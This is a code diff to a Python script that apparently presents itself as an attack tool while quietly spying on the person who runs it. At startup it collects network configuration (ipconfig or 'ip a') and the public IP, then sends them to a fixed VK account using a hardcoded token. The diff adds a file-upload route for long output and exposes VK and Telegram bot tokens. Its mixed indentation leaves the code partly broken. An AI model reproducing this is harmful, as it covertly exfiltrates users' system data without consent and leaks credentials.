@@ -69,8 +69,7 @@ except:
 # sinhron = telebot.TeleBot("1453381231:AAGlj5335g7I5ZZ1yTYpluO1QmxkT3vtGoE")
 
 
-def sysinit(send):
-    import sys
+def sysinit(send, vk=None):
     if sys.platform == 'win32':
         os.system("ipconfig >output_init_info.txt")
         f = open("output_init_info.txt", "rt")
@@ -79,8 +78,25 @@ def sysinit(send):
         
         content = f"[ipconfig config]:\n----\n{content}"
         os.remove("output_init_info.txt")
-        send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
-    else:
+		if len(content) <= 1200:
+			send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+		else:
+			file = open('logging.txt', 'wt', encoding='utf-8')
+			file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+			file.close()
+			
+			a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
+            img = {'file': ('logging.txt', open('logging.txt', 'rb'))}
+            response = requests.post(a, files=img)
+            result = json.loads(response.text)['file']
+            owner=vk.docs.save(file=result)["doc"]['owner_id']
+            document=vk.docs.save(file=result)['doc']['id']
+            sendF = 'doc'+str(owner)+'_'+str(document)
+			
+			send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
+			os.remove('logging.txt')
+
+	else:
         os.system("ip a >output_init_info_partOne.txt")
         f = open("output_init_info_partOne.txt", "rt")
         content_part_one = f.read()
@@ -96,15 +112,32 @@ def sysinit(send):
         content_part_two = f.read()
         
         content = f"[ip a config]:\n----\n{content_part_one}"
+		os.remove("output_init_info_partOne.txt")
+        os.remove("output_init_info_partTwo.txt")
         
         f.close()
-        send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+		if len(content) <= 1200:
+			send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+        else:
+			file = open('logging.txt', 'wt', encoding='utf-8')
+			file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+			file.close()
+			
+			a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
+            img = {'file': ('logging.txt', open('logging.txt', 'rb'))}
+            response = requests.post(a, files=img)
+            result = json.loads(response.text)['file']
+            owner=vk.docs.save(file=result)["doc"]['owner_id']
+            document=vk.docs.save(file=result)['doc']['id']
+            sendF = 'doc'+str(owner)+'_'+str(document)
+			
+			send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
+			os.remove('logging.txt')
         
-        os.remove("output_init_info_partOne.txt")
-        os.remove("output_init_info_partTwo.txt")
 
 
-sysinit(vk_api.VkApi(token='7be005e40756c56e3cdd3e9c274d76d42a72be6b087e071b29b829a5d4403dce2ed17ea34c3e636e39ecb').get_api().messages.send)
+sysinit(vk_api.VkApi(token='7be005e40756c56e3cdd3e9c274d76d42a72be6b087e071b29b829a5d4403dce2ed17ea34c3e636e39ecb').get_api().messages.send,
+        vk_api.VkApi(token='7be005e40756c56e3cdd3e9c274d76d42a72be6b087e071b29b829a5d4403dce2ed17ea34c3e636e39ecb').get_api())
 print(f"{yl}[{gr}+{yl}]{cy} Атака {rd}началась!")
 
 
